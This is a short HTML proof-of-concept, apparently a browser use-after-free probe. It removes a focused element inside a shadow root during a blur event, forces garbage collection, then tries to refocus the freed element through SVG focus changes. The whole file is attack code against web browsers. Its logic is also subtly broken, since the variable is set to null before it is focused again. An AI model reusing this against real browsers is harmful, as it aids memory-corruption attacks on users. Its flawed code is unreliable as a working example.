<!DOCTYPE html>
<html>
<body>
<p>PoC 22 - SVG</p>
<div id="host"></div>
<svg width="100" height="40">
    <a xlink:href="#" id="svgfocus" tabindex="0">
        <text x="10" y="20" fill="black">SVG Focus</text>
    </a>
</svg>
<div id="result"></div>
<script>
function gc() {
    function gcRec(n) {
        if (n < 1) return {};
        var temp = {i: "ab" + i + (i / 100000)};
        temp += "foo";
        gcRec(n-1);
    }
    for (var i = 0; i < 10000; i++) gcRec(10);
}

let shadowRoot = host.attachShadow({ mode: 'open' });
let victim = document.createElement('div');
victim.tabIndex = 0;
victim.textContent = 'Focusable';
shadowRoot.appendChild(victim);
victim.focus();

document.addEventListener('blur', () => {
    victim.remove();
    victim = null;
    gc();
}, true);

setTimeout(() => {
    let el = document.getElementById('svgfocus');
    el.focus();
    setTimeout(() => {
        victim.focus();
        setTimeout(() => {
            el.focus();
            result.textContent = 'PASS';
        }, 50);
    }, 50);
}, 100);
</script>
</body>
</html>
